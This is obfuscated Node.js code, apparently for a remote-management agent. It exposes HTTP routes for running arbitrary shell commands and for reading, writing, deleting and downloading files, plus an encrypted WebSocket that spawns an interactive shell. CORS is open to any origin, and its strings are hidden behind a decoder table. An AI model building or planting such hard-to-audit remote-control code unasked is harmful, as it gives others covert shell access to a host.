        const d = Buffer[bg(0x2a4)](a[bg(0x347)]), f = this[bg(0x2f9)] ? Buffer[bg(0x2a4)](this[bg(0x2f9)], a[bg(0x120)]) : null, g = this[bg(0x3ad)] ? Buffer[bg(0x2a4)](this['expectedRemotePubB64'], a[bg(0x120)]) : null;
        this['hs'][bg(0x258)](d, f, g, null);
    }
    ['processHandshake'](a) {
        const bh = a0U, b = {
                'KRwsW': function (d, f) {
                    return d > f;
                },
                'InpHw': function (d, f) {
                    return d === f;
                }
            };
        if (this[bh(0x1ae)])
            return Buffer[bh(0x2eb)](0x0);
        const c = a0M;
        a && b[bh(0x3a6)](a[bh(0x3d0)], 0x0) && b[bh(0x307)](this['hs']['GetAction'](), c[bh(0x3fe)][bh(0x237)]) && this['hs']['ReadMessage'](a);
        if (b[bh(0x307)](this['hs']['GetAction'](), c['constants']['NOISE_ACTION_SPLIT']))
            return this[bh(0x306)](), Buffer[bh(0x2eb)](0x0);
        if (this['hs'][bh(0x20e)]() === c['constants'][bh(0x253)]) {
            const d = this['hs'][bh(0x267)](new Uint8Array(0x0));
            return b['InpHw'](this['hs'][bh(0x20e)](), c['constants'][bh(0x341)]) && this[bh(0x306)](), Buffer[bh(0x2a4)](d);
        }
        return Buffer[bh(0x2eb)](0x0);
    }
    [a0U(0x306)]() {
        const bi = a0U, a = this['hs'][bi(0x1b4)]();
        this[bi(0x309)] = a[0x0], this[bi(0x3c6)] = a[0x1], this[bi(0x1ae)] = !![];
        try {
            if (this['hs'])
                this['hs'][bi(0x345)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0U(0x3d6)](a) {
        const bj = a0U;
        if (!this[bj(0x1ae)])
            throw new Error('握手未完成，无法加密数据');
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[bj(0x2a4)](this['sendCipher']['EncryptWithAd'](b, c));
    }
    [a0U(0x35e)](a) {
        const bk = a0U, b = { 'clRgH': bk(0x177) };
        if (!this[bk(0x1ae)])
            throw new Error(b[bk(0x2de)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bk(0x2a4)](this[bk(0x3c6)]['DecryptWithAd'](c, d));
    }
    ['free']() {
        const bl = a0U, a = { 'VADtH': '3|5|4|2|0|1' }, b = a['VADtH'][bl(0x311)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bl(0x3c6)] = null;
                continue;
            case '1':
                this['hs'] = null;
                continue;
            case '2':
                this[bl(0x309)] = null;
                continue;
            case '3':
                try {
                    if (this[bl(0x309)])
                        this[bl(0x309)][bl(0x345)]();
                } catch (d) {
                }
                continue;
            case '4':
                try {
                    if (this['hs'])
                        this['hs'][bl(0x345)]();
                } catch (f) {
                }
                continue;
            case '5':
                try {
                    if (this[bl(0x3c6)])
                        this[bl(0x3c6)]['free']();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0Q {
    constructor() {
        const bm = a0U, a = { 'rIFaG': bm(0x359) };
        this[bm(0x3ea)] = null, this['websocket'] = null, this['requestId'] = null, this[bm(0x33e)] = !![], this[bm(0x168)] = a[bm(0x14d)], this[bm(0x3ce)] = [], this[bm(0x343)] = [], this[bm(0x17f)] = a0F['NOISE_KEYS_INTERNAL'][bm(0x23e)]['private_b64'], this[bm(0x1fd)] = a0F[bm(0x3e8)][bm(0x176)][bm(0x2b6)], this[bm(0x153)] = new a0P(![], this[bm(0x17f)], this[bm(0x1fd)]);
    }
    async [a0U(0x1e6)]() {
        const bn = a0U, a = {
                'cHcJt': function (b, c) {
                    return b === c;
                },
                'fAquM': bn(0x22b)
            };
        this['requestId'] && a0v[bn(0x19b)]('[' + this[bn(0x3ff)] + bn(0x3d8));
        if (this[bn(0x3ea)]) {
            try {
                this['ptyProcess'][bn(0x28b)]();
            } catch (b) {
            }
            this[bn(0x3ea)] = null;
        }
        if (this[bn(0x153)])
            this[bn(0x153)]['free']();
        if (this[bn(0x39b)])
            try {
                a[bn(0x1ef)](this[bn(0x39b)][bn(0x251)], this[bn(0x39b)]['OPEN']) && this[bn(0x39b)]['close'](0x3e8, a[bn(0x200)]);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0U(0x1d5)](a) {
        const bo = a0U, b = {
                'DdQHZ': bo(0x359),
                'mAnDy': function (c, d) {
                    return c > d;
                },
                'XyjWq': function (c, d) {
                    return c === d;
                }
            };
        if (this['phase'] === b[bo(0x27a)]) {
            if (b['mAnDy'](this[bo(0x343)][bo(0x3d0)], 0x0)) {
                const c = this['msgResolvers'][bo(0x25d)]();
                c(a);
            } else
                this[bo(0x3ce)][bo(0x32e)](a);
        } else
            b['XyjWq'](this[bo(0x168)], bo(0x18c)) && this[bo(0x2c1)](a);
    }
    async ['_receiveWsBytes']() {
        const bp = a0U, a = {
                'ozkcZ': function (b, c) {
                    return b > c;
                }
            };
        if (a[bp(0x1ec)](this[bp(0x3ce)][bp(0x3d0)], 0x0))
            return this[bp(0x3ce)][bp(0x25d)]();
        return new Promise(b => {
            const bq = bp;
            this['msgResolvers'][bq(0x32e)](b);
        });
    }
    async [a0U(0x375)](a) {
        const br = a0U, b = {
                'gWbPF': function (c, d) {
                    return c(d);
                },
                'UAUSs': br(0x3c2),
                'iBRhA': br(0x1b2),
                'rraTf': br(0x324),
                'ddeiS': function (c, d) {
                    return c(d);
                },
                'HpeZV': br(0x197)
            };
        b[br(0x348)](a, b[br(0x192)]);
        try {
            await this[br(0x153)]['init']();
            const c = await this[br(0x17d)](), d = this[br(0x153)][br(0x34c)](c);
            d && d[br(0x3d0)] > 0x0 && this['websocket'][br(0x1dd)](d);
            const f = await this['_receiveWsBytes']();
            this[br(0x153)][br(0x34c)](f);
            if (!this[br(0x153)][br(0x1ae)])
                throw new Error(b[br(0x24a)]);
            b[br(0x348)](a, b['rraTf']);
        } catch (g) {
            b[br(0x143)](a, '💥\x20握手失败详情:\x20' + g[br(0x3d7)]);
            throw new Error(b['HpeZV']);
        }
    }
    [a0U(0x2e0)]() {
        const bs = a0U, a = {
                'nIBlr': '/bin/zsh',
                'YRGCK': bs(0x260),
                'DkIas': bs(0x21d)
            }, b = process.env.SHELL;
        if (b && a0h[bs(0x1c0)](b))
            return b;
        const c = [
            bs(0x1ba),
            a[bs(0x3b2)],
            a[bs(0x34a)],
            a[bs(0x158)]
        ];
        for (const d of c) {
            if (a0h[bs(0x1c0)](d))
                return d;
        }
        return a[bs(0x158)];
    }
    async [a0U(0x2d6)](a, b, c) {
        const bt = a0U, d = {
                'YmsxU': function (g, h) {
                    return g(h);
                },
                'IxCML': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'ZuAib': bt(0x12a),
                'iRgcw': bt(0x3d7)
            };
        this[bt(0x39b)] = a, this[bt(0x3ff)] = b;
        const f = g => a0v[bt(0x19b)]('[终端会话\x20' + b + ']\x20' + g);
        this[bt(0x33e)] = !c, d[bt(0x308)](f, this[bt(0x33e)] ? d[bt(0x20f)] : d[bt(0x212)]), a['on'](d[bt(0x139)], g => this['_handleRawMessage'](g));
        try {
            this[bt(0x33e)] && await this[bt(0x375)](f), await this[bt(0x20c)](f);
        } catch (g) {
            d[bt(0x308)](f, bt(0x10a) + g[bt(0x3d7)]), await this[bt(0x1e6)]();
        }
    }
    async ['_runTerminal'](a) {
        const bu = a0U, b = {
                'vjbKz': function (f, g) {
                    return f === g;
                },
                'BLYxf': function (f, g) {
                    return f(g);
                },
                'mXBgt': '🔌\x20客户端主动断开',
                'iVyZy': bu(0x24d),
                'ZcniZ': bu(0x11d),
                'tFOoO': bu(0x18c)
            }, c = this['getAvailableShell']();
        a(bu(0x2b2) + c);
        const d = Object[bu(0x175)]({}, process.env);
        delete d[bu(0x3fd)], d[bu(0x31c)] = b[bu(0x2d8)];
        if (!d[bu(0x134)])
            d['LANG'] = b[bu(0x335)];
        try {
            this[bu(0x3ea)] = a0u[bu(0x1ca)](c, [], {
                'name': 'xterm-256color',
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process['cwd'](),
                'env': d
            }), b[bu(0x196)](a, bu(0x224) + (this[bu(0x3ea)][bu(0x2ff)] || bu(0x16f)) + ')'), this[bu(0x168)] = b[bu(0x265)];
            while (this[bu(0x3ce)][bu(0x3d0)] > 0x0) {
                const f = this[bu(0x3ce)][bu(0x25d)]();
                this[bu(0x2c1)](f);
            }
            this[bu(0x3ea)][bu(0x123)](g => {
                const bv = bu;
                try {
                    let h = Buffer[bv(0x2a4)](g, bv(0x1fe));
                    this[bv(0x33e)] && this['cipher'] && this[bv(0x153)][bv(0x1ae)] && (h = this['cipher'][bv(0x3d6)](h)), b[bv(0x1f0)](this[bv(0x39b)][bv(0x251)], 0x1) && this[bv(0x39b)][bv(0x1dd)](h);
                } catch (i) {
                }
            }), this[bu(0x3ea)][bu(0x283)](({
                exitCode: g,
                signal: h
            }) => {
                const bw = bu;
                b[bw(0x196)](a, bw(0x206) + g + bw(0x171) + h + ')'), this[bw(0x1e6)]();
            }), this[bu(0x39b)]['on'](bu(0x1ad), () => {
                const bx = bu;
                b['BLYxf'](a, b['mXBgt']), this[bx(0x1e6)]();
            });
        } catch (g) {
            b[bu(0x196)](a, '💥\x20启动终端失败:\x20' + g[bu(0x3d7)]), await this[bu(0x1e6)]();
            throw g;
        }
    }
    ['_processTerminalMessage'](a) {
        const by = a0U, b = {
                'vcjAy': 'utf-8',
                'UhmKN': function (c, d) {
                    return c === d;
                },
                'bCGBP': function (c, d) {
                    return c === d;
                },
                'JpQJw': by(0x37d),
                'slWbx': function (c, d) {
                    return c === d;
                },
                'FHkST': by(0x1c3),
                'UlQdy': function (c, d) {
                    return c !== d;
                },
                'bHObD': by(0x2b4)
            };
        if (!this[by(0x3ea)])
            return;
        try {
            const c = Buffer['from'](a);
            let d;
            this[by(0x33e)] ? d = this[by(0x153)]['decrypt'](c) : d = c;
            let f = ![], g = d[by(0x3f1)](b[by(0x389)]);
            if (g[by(0x19c)]()['startsWith']('{'))
                try {
                    const h = JSON[by(0x30c)](g);
                    f = !![];
                    if (b[by(0x313)](h['type'], by(0x37b))) {
                        let i = Buffer[by(0x2a4)](JSON['stringify']({ 'type': by(0x37b) }));
                        if (this[by(0x33e)])
                            i = this['cipher'][by(0x3d6)](i);
                        this[by(0x39b)]['send'](i);
                        return;
                    }
                    if (b['bCGBP'](h[by(0x295)], b[by(0x34b)])) {
                        this['ptyProcess'][by(0x37d)](h['cols'] || 0x50, h[by(0x14b)] || 0x18);
                        return;
                    }
                    if (b['slWbx'](h[by(0x295)], b['FHkST']) && b[by(0x110)](h[by(0x2ec)], undefined)) {
                        let j = b['UhmKN'](h[by(0x2ea)], b[by(0x2ab)]) ? Buffer[by(0x2a4)](h[by(0x2ec)], b[by(0x2ab)])[by(0x3f1)](b[by(0x389)]) : h[by(0x2ec)];
                        this[by(0x3ea)][by(0x2f0)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[by(0x3ea)][by(0x2f0)](d[by(0x3f1)](b[by(0x389)]));
        } catch (l) {
            a0v[by(0x19b)](by(0x19f) + this[by(0x3ff)] + ']\x20⚠️\x20指令处理异常:\x20' + l['message']);
            if (this[by(0x33e)])
                this[by(0x1e6)]();
        }
    }
}
async function a0R() {
    const bz = a0U, a = {
            'qAUXh': bz(0x31a),
            'ustzP': bz(0x159),
            'KQdDg': 'Access-Control-Allow-Headers',
            'CaXLz': bz(0x385),
            'IGzMr': bz(0x369),
            'swamq': function (b, c) {
                return b === c;
            },
            'BZusI': function (b, c) {
                return b === c;
            },
            'sAfgI': 'error',
            'LPimm': function (b, c) {
                return b === c;
            },
            'xXKuG': 'string',
            'cVHQD': function (b, c) {
                return b === c;
            },
            'LkOaC': 'cmd\x20required',
            'JTRMf': bz(0x2b4),
            'wUJzh': 'x-file-size',
            'gMQoI': bz(0x1be),
            'Mpykl': bz(0x3d1),
            'bFtrK': function (b, c, d) {
                return b(c, d);
            },
            'rZeOG': 'Closing\x20connection\x20due\x20to\x20missing\x20request_id',
            'uPloT': bz(0x2ca),
            'qXmYh': 'Shutting\x20down...',
            'YLsvi': bz(0x3ba),
            'hJqev': bz(0x2ac),
            'alVlD': 'Initializing\x20CryptoManager...',
            'izCYg': 'Initializing\x20SystemInfoCollector...',
            'qozmQ': bz(0x169),
            'mSFbC': bz(0x364),
            'VXNHW': function (b) {
                return b();
            },
            'mbCbz': function (b, c) {
                return b(c);
            },
            'RViXe': bz(0x21f),
            'HLZxv': function (b, c) {
                return b(c);
            },
            'guIUR': bz(0x2be),
            'GkfgA': bz(0x327),
            'Ntlel': bz(0x287),
            'iPphU': bz(0x346),
            'ekCvi': bz(0x227),
            'SJZmH': '/api/file/authority',
            'vvkIA': bz(0x221),
            'yxEVu': '/api/file/download',
            'bstvc': bz(0x2e2),
            'bPhNH': '/api/file/new',
            'EoppN': bz(0x3ee),
            'mUiKF': bz(0x2d7),
            'UkOjo': '/api/task/log/onetime',
            'wEfhq': bz(0x26b),
            'oDFoQ': bz(0x344),
            'XGItz': bz(0x220),
            'vTFVV': 'Setting\x20up\x20WebSocket\x20terminal\x20route...',
            'bJqhd': bz(0x256),
            'xONRM': bz(0x3dd),
            'vWCKz': bz(0x1c6),
            'JpAfy': bz(0x374),
            'XWaXt': 'SIGINT\x20handler\x20registered',
            'xTvOy': 'Fatal\x20error\x20in\x20main():'
        };
    try {
        a0v[bz(0x3e1)](bz(0x3e7)), a0v[bz(0x3e1)](a['YLsvi']), a0F[bz(0x387)](), a0v['debug'](a[bz(0x304)]), a0v['debug'](a[bz(0x33a)]);
        const b = new a0G(a0F[bz(0x2df)], a0F['ECIES_PUBLIC_KEY_PEM']);
        a0v[bz(0x3e1)]('CryptoManager\x20initialized'), a0v[bz(0x3e1)](a[bz(0x270)]);
        const c = new a0I();
        a0v[bz(0x3e1)](a[bz(0x3a8)]), a0v[bz(0x3e1)](a[bz(0x22f)]);
        const d = a['VXNHW'](a0f);
        a['mbCbz'](a0q, d), a0v[bz(0x3e1)](a[bz(0x367)]), d[bz(0x296)]((g, h, i) => {
            const bA = bz;
            h[bA(0x3f8)](a['qAUXh'], '*'), h[bA(0x3f8)](a['ustzP'], bA(0x185)), h['header'](a['KQdDg'], a[bA(0x1cc)]), h[bA(0x3f8)](a[bA(0x3e5)], 'x-encrypted,\x20x-agent-version,\x20x-file-size,\x20x-original-path');
            if (a[bA(0x1ee)](g[bA(0x3b4)], 'OPTIONS'))
                return h[bA(0x271)](0xc8)[bA(0x31e)]();
            i();
        }), d[bz(0x296)](a0f['text']({
            'type': () => !![],
            'limit': '50mb'
        })), d[bz(0x296)](a0f[bz(0x352)]({ 'extended': !![] })), d['use'](a[bz(0x3dc)](a0H, b)), a0v[bz(0x3e1)](a[bz(0x229)]), d[bz(0x39f)](a[bz(0x13b)], async (g, h) => {
            const bB = bz;
            try {
                const i = await c['getBasicInfo']();
                a['BZusI'](g[bB(0x228)], ![]) && (i[bB(0x201)] = null, i['noise_key'] = null), h[bB(0x395)](i);
            } catch (j) {
                h[bB(0x271)](0x1f4)['json']({
                    'status': a[bB(0x393)],
                    'message': j[bB(0x3d7)]
                });
            }
        }), d[bz(0x39f)](a[bz(0x1a1)], async (g, h) => {
            const bC = bz;
            try {
                const i = await c['getRealtimeInfo']();
                h[bC(0x395)](i);
            } catch (j) {
                h[bC(0x271)](0x1f4)[bC(0x395)]({
                    'status': a[bC(0x393)],
                    'message': j[bC(0x3d7)]
                });
            }
        }), d[bz(0x2d0)](a[bz(0x10d)], async (g, h) => {
            const bD = bz;
            try {
                let i = null;
                if (a[bD(0x1fc)](typeof g['body'], a[bD(0x255)]))
                    i = g[bD(0x31d)][bD(0x19c)]();
                else
                    g[bD(0x31d)] && a[bD(0x166)](typeof g[bD(0x31d)], bD(0x310)) && (i = g[bD(0x31d)][bD(0x29c)] || '');
                if (!i)
                    return h[bD(0x271)](0x190)[bD(0x395)]({
                        'status': a[bD(0x393)],
                        'message': a[bD(0x2bd)]
                    });
                const j = await a0J['execute'](i, {
                    'cwd': g[bD(0x31d)][bD(0x1b6)],
                    'env': g[bD(0x31d)][bD(0x27c)],
                    'timeout': a0F[bD(0x2b3)]
                });
                h[bD(0x395)](j);
            } catch (k) {
                h[bD(0x271)](0x1f4)[bD(0x395)]({
                    'status': bD(0x1a3),
                    'message': k[bD(0x3d7)]
                });
            }
        }), d[bz(0x2d0)](a['ekCvi'], async (g, h) => {
            const bE = bz;
            try {
                const i = await a0K[bE(0x3d2)](g[bE(0x31d)][bE(0x11b)], g[bE(0x31d)][bE(0x2ee)]);
                h[bE(0x395)]({
                    'status': 'ok',
                    'count': i[bE(0x3d0)],
                    'files': i
                });
            } catch (j) {
                h[bE(0x271)](0x1f4)[bE(0x395)]({
                    'status': bE(0x1a3),
                    'message': j[bE(0x3d7)]
                });
            }
        }), d[bz(0x2d0)](a[bz(0x1e1)], async (g, h) => {
            const bF = bz;
            try {
                const i = await a0K[bF(0x2bf)](g[bF(0x31d)][bF(0x305)] || []);
                h[bF(0x395)]({
                    'status': 'ok',
                    'files': i
                });
            } catch (j) {
                h[bF(0x271)](0x1f4)['json']({
                    'status': bF(0x1a3),
                    'message': j[bF(0x3d7)]
                });
            }
        }), d[bz(0x15e)](a['SJZmH'], async (g, h) => {
            const bG = bz;
            try {
                const i = g[bG(0x31d)][bG(0x1f5)] || {}, j = a[bG(0x261)](g[bG(0x31d)][bG(0x2ee)], !![]), k = await a0K[bG(0x1a2)](i, j);
                h[bG(0x395)](k);
            } catch (l) {
                h[bG(0x271)](0x1f4)[bG(0x395)]({
                    'status': a['sAfgI'],
                    'message': l[bG(0x3d7)]
                });
            }
        }), d[bz(0x2d0)]('/api/file/cat', async (g, h) => {
            const bH = bz;
            try {
                const i = await a0K[bH(0x232)](g[bH(0x31d)][bH(0x11b)]);
                h['json'](i);
            } catch (j) {
                h['status'](0x1f4)['json']({
                    'status': a['sAfgI'],
                    'message': j[bH(0x3d7)]
                });
            }
        }), d[bz(0x2d0)](a[bz(0x22a)], async (g, h) => {
            const bI = bz;
            try {
                const i = await a0K[bI(0x302)](g['body'][bI(0x11b)], g[bI(0x31d)]['filename'], g[bI(0x31d)][bI(0x22c)], g['body'][bI(0x3ed)], g[bI(0x31d)][bI(0x1ed)]);
                h[bI(0x395)](i);
            } catch (j) {
                h['status'](0x1f4)[bI(0x395)]({
                    'status': bI(0x1a3),
                    'message': j['message']
                });
            }
        }), d[bz(0x2d0)](a[bz(0x21c)], async (g, h) => {
            const bJ = bz;
            try {
                const i = await a0K[bJ(0x207)](g['body'][bJ(0x11b)]), j = Buffer[bJ(0x2a4)](i[bJ(0x22c)], a[bJ(0x1bc)]);
                return h['set'](a[bJ(0x15c)], i[bJ(0x356)][bJ(0x3f1)]()), h[bJ(0x10c)](a[bJ(0x183)], i[bJ(0x11b)]), h[bJ(0x10c)]('content-type', a['Mpykl']), h['send'](j);
            } catch (k) {
                h['status'](0x1f4)[bJ(0x395)]({
                    'status': a[bJ(0x393)],
                    'message': k[bJ(0x3d7)]
                });
            }
        }), d['delete']('/api/file', async (g, h) => {
            const bK = bz;
            try {
                let i = g[bK(0x31d)][bK(0x305)];
                if (!i || !Array['isArray'](i)) {
                    i = [];
                    if (g[bK(0x31d)][bK(0x11b)])
                        i['push'](g[bK(0x31d)][bK(0x11b)]);
                    if (g[bK(0x31d)][bK(0x136)])
                        i[bK(0x32e)](g[bK(0x31d)][bK(0x136)]);
                }
                const j = await a0K[bK(0x357)](i);
                h[bK(0x395)]({
                    'status': 'ok',
                    'results': j
                });
            } catch (k) {
                h[bK(0x271)](0x1f4)[bK(0x395)]({
                    'status': a[bK(0x393)],
                    'message': k['message']
                });
            }
        }), d[bz(0x15e)]('/api/file', async (g, h) => {
            const bL = bz;
            try {
                const i = await a0K[bL(0x36e)](g[bL(0x31d)][bL(0x2c6)] || g[bL(0x31d)]);
                h['json']({
                    'status': 'ok',
                    'total': i['length'],
                    'success': i['filter'](j => j[bL(0x271)] === 'ok')[bL(0x3d0)],
                    'results': i
                });
            } catch (j) {
                h['status'](0x1f4)[bL(0x395)]({
                    'status': a['sAfgI'],
                    'message': j[bL(0x3d7)]
                });
            }
        }), d[bz(0x2d0)](a[bz(0x16a)], async (g, h) => {
            const bM = bz;
            try {
                const i = await a0K['copyFiles'](g[bM(0x31d)]);
                h[bM(0x395)]({
                    'status': 'ok',
                    'total': i['length'],
                    'success': i[bM(0x35f)](j => j[bM(0x271)] === 'ok')[bM(0x3d0)],
                    'results': i
                });
            } catch (j) {
                h[bM(0x271)](0x1f4)[bM(0x395)]({
                    'status': a['sAfgI'],
                    'message': j[bM(0x3d7)]
                });
            }
        }), d['post'](a['bPhNH'], async (g, h) => {
            const bN = bz;
            try {
                const i = await a0K[bN(0x1f8)](g['body'][bN(0x11b)]);
                h[bN(0x395)](i);
            } catch (j) {
                h[bN(0x271)](0x1f4)['json']({
                    'status': bN(0x1a3),
                    'message': j[bN(0x3d7)]
                });
            }
        }), d[bz(0x39f)](bz(0x3ee), (g, h) => {
            const bO = bz;
            h[bO(0x395)](a0L['getOnetimeTasks']());
        }), d['post'](a[bz(0x401)], async (g, h) => {
            const bP = bz;
            try {
                const i = await a0L[bP(0x402)](g[bP(0x31d)]);
                h[bP(0x395)](i);
            } catch (j) {
                h[bP(0x271)](0x1f4)['json']({
                    'status': bP(0x1a3),
                    'message': j[bP(0x3d7)]
                });
            }
        }), d[bz(0x39f)](a[bz(0x1a4)], (g, h) => {
            const bQ = bz;
            h[bQ(0x395)](a0L[bQ(0x140)]());
        }), d[bz(0x2d0)](a[bz(0x1a4)], (g, h) => {
            const bR = bz;
            try {
                const i = a0L[bR(0x3a2)](g['body']);
                h[bR(0x395)](i);
            } catch (j) {
                h[bR(0x271)](0x1f4)[bR(0x395)]({
                    'status': a[bR(0x393)],
                    'message': j[bR(0x3d7)]
                });
            }
        }), d[bz(0x39f)](bz(0x11f), (g, h) => {
            const bS = bz;
            h[bS(0x395)](a0L[bS(0x38e)]());
        }), d[bz(0x39f)](a[bz(0x1eb)], (g, h) => {
            const bT = bz;
            let i = a['bFtrK'](parseInt, g[bT(0x1f4)][bT(0x314)], 0xa) || 0x32;
            i = Math[bT(0x3c5)](Math[bT(0x186)](i, 0x1), 0x64), h[bT(0x395)](a0L['getOnetimeLogs'](i));
        }), d['get'](a['wEfhq'], (g, h) => {
            const bU = bz;
            let i = a['bFtrK'](parseInt, g[bU(0x1f4)][bU(0x314)], 0xa) || 0x32;
            i = Math[bU(0x3c5)](Math['max'](i, 0x1), 0x64), h[bU(0x395)](a0L[bU(0x407)](i));
        }), d['delete'](a['UkOjo'], (g, h) => {
            const bV = bz;
            h[bV(0x395)](a0L[bV(0x193)]());
        }), d[bz(0x2a1)](a[bz(0x1df)], (g, h) => {
            const bW = bz;
            h[bW(0x395)](a0L[bW(0x1e4)]());
        }), d[bz(0x39f)](a[bz(0x145)], (g, h) => {
            const bX = bz;
            h['json'](a0L[bX(0x250)]());
        }), d[bz(0x2d0)](a[bz(0x2aa)], async (g, h) => {
            const bY = bz;
            try {
                const i = await a0L[bY(0x28f)]();
                h['json'](i);
            } catch (j) {
                h[bY(0x271)](0x1f4)[bY(0x395)]({
                    'status': a[bY(0x393)],
                    'message': j[bY(0x3d7)]
                });
            }
        }), a0v[bz(0x3e1)](a[bz(0x236)]), d['ws'](a[bz(0x36d)], async (g, h) => {
            const bZ = bz, i = h['params'][0x0];
            a0v['debug'](bZ(0x1d9) + h[bZ(0x2af)]), a0v[bZ(0x3e1)]('Matched\x20Sub-path:\x20' + i);
            const j = h['query'][bZ(0x219)], k = h[bZ(0x1f4)][bZ(0x12b)];
            a0v[bZ(0x3e1)](bZ(0x3cf) + j);
            if (!j) {
                a0v[bZ(0x3e1)](a[bZ(0x3ac)]), g[bZ(0x1ad)](0x3f0, bZ(0x3c7));
                return;
            }
            const l = new a0Q();
            await l['startSession'](g, j, k);
        }), a0v[bz(0x3e1)](a['xONRM']), a0v['debug'](a[bz(0x3b1)]);
        const f = d[bz(0x331)](a0F[bz(0x157)], a0F['HOST'], () => {
            const c0 = bz;
            a0v['debug'](c0(0x3e3) + a0F[c0(0x199)] + c0(0x249) + a0F['HOST'] + ':' + a0F[c0(0x157)]), a0v['debug'](a[c0(0x354)]);
        });
        process['on'](a[bz(0x3f6)], () => {
            const c1 = bz;
            a0v[c1(0x3e1)](a['qXmYh']), f[c1(0x1ad)](), process['exit'](0x0);
        }), a0v[bz(0x3e1)](a['XWaXt']);
    } catch (g) {
        a0v[bz(0x1a3)](a[bz(0x1cf)], g), process[bz(0x291)](0x1);
    }
}
(require['main'] === module || require[a0U(0x32b)]?.[a0U(0x1c2)]?.[a0U(0x1fb)]('ts-node')) && a0R()[a0U(0x244)](a0v[a0U(0x1a3)]);
function a0a() {
    const c2 = [
        'Aw5XCu4',
        'mta0odu3nJaW',
        'te9hx0XfvKvm',
        'y2f0y2G',
        'mte4mdm0otfeqwrmqKW',
        'u0HbmJu2',
        'z09XBKW',
        'reneBxy',
        'ihn0yxj0zwqGB24G',
        'AujsAee',
        'u1bTveG',
        'DxvZBfi',
        'EhrLCM0TmJu2y29SB3i',
        'rurjDNy',
        'B2reswe',
        'z2v0tg9Nu3vTBwfYEq',
        'CMvHzhLtDgf0zq',
        'zNvUy3rPB24',
        'tK9ju0vFqunusu9ox1Dssvrfx01fu1nbr0u',
        'zxLk',
        'EfHlDuC',
        'l2fWAs93CY8Q',
        'wf9psW',
        'sw5PDgLHBgL6zq',
        'DMvYAwz5',
        'zxHPDgnVzgu',
        'vLbSDKG',
        'C2rJrhC',
        'C2HPzNq',
        'veTJr2S',
        'C2HHmJu2',
        'l2jPBI9HC2G',
        'qLP1C0K',
        'mc4WlJaUma',
        'y2LWAgvYDgv4Da',
        'ywnJzxnZx2rLBMLLza',
        'DezpB08',
        'DgrfvNu',
        'v3jPDgvnzxnZywDL',
        'Ahr0Chm',
        'A2v5rNjVBvb1yMXPyW',
        'C2XPy2u',
        'l2fWAs90yxnRl2XVzY9JCM9U',
        'zK95svq',
        'u2LNBMf0DxjLihzLCMLMAwnHDgLVBIbMywLSzwq6ia',
        'z2v0tg9JywXjuhy0',
        'AxneAxjLy3rVCNK',
        'AxPdwwC',
        'C3rHDhvZ',
        'DhHFyNL0zxm',
        'DufbALy',
        'EuHLrLG',
        'A2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'Dw5SAw5Ru3LUyW',
        'zM9YrwfJAa',
        's2DQzu8',
        'rgrrsfO',
        'tefstu4',
        'zw52',
        'zu1otgK',
        'yNjHBMq',
        'l2rLDI8',
        'zMfSC2u',
        'mZyWma',
        'CgfKu3rHCNq',
        'B25fEgL0',
        'zuTXEKW',
        'C3rHDfn5BMm',
        'CMvZDwX0',
        'l2fWAs9ZDgf0Dxm',
        'zgLYBMfTzq',
        'BgfZDe5LDhDVCMTuAw1L',
        'y3jLyxrLrgvJAxbOzxjPDG',
        'A2LSBa',
        'l3bYB2mVy3b1Aw5MBW',
        'rezwB3a',
        'qwjLAw0',
        'zxHLy3v0zu9UzxrPBwvuyxnRCW',
        'y3jLyxrLsgfZAa',
        'zxHPDa',
        'svb2nG',
        'y291BNq',
        'qvzfDMS',
        'DhLWzq',
        'DxnL',
        'D3nVz2q',
        'EMvZshu',
        'zg9JA2vY',
        'BMfTzq',
        'B3bAu3u',
        'y21K',
        'tevwruXt',
        'A3zIEuS',
        'runeu0fFufvcs0vz',
        'runeu0fFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvTios4JEwTMowCQa',
        'zgvSzxrL',
        'rg9JA2vY',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lMn1CNjLBNq',
        'zNjVBq',
        'tNHgzxu',
        'BfPMuM8',
        'x2DLDenVBM5Ly3rPB25Z',
        'y3jVBKPVyNm',
        's1zn',
        'weDjDhO',
        'yKHpyKq',
        'q29UzMLNihzHBgLKyxrLza',
        'Axnoyu4',
        'u0Pxq2C',
        'DxjS',
        'CYa+ia',
        'CMvHzezPBgvtEw5J',
        '8j+qMIdKVB/NLkGGu2HLBgWG6lEV5B6eoIa',
        'uNrPBwvVDxq',
        'yMfZzty0',
        'zMXVB3i',
        'ChvIBgLJx2i2na',
        'z1bHB3u',
        'r1fpDe0',
        'BMv0D29YAW',
        'ANjmuNi',
        'we5euwK',
        'ugf0AcbUB3qGzM91BMq',
        'tgTpyum',
        'twLKzgXLD2fYzsbHChbSAwvKlcbZzxr0Aw5NihvWihjVDxrLCY4UlG',
        'z2v0rMLSzvbLCM1PC3nPB25Z',
        'y0nuCe8',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'x2DLBMvYyxrLuMf3s2v5CgfPCG',
        'rLvQqMS',
        'rM12zg8',
        'C3rHDhvZq29Kzq',
        'Bw92zv9Tyxa',
        'AxnjBML0Awf0B3i',
        'y2HTB2rtEw5J',
        'DurlB3u',
        'u2vYDMvYigXPC3rLBMLUzYbZDwnJzxnZzNvSBhK',
        'zxHLy3v0ywjSzq',
        'lNvWBg9Hzf9JAhvUA3m',
        'rMLSzsbUB3qGzM91BMq',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdMOlJLV4pNU4JNQ6/KVP3OTzyGkhb0EsKG5yQG6l295AsX6lsL77Ym56Il5BQp57Ui5Q2I77Yb',
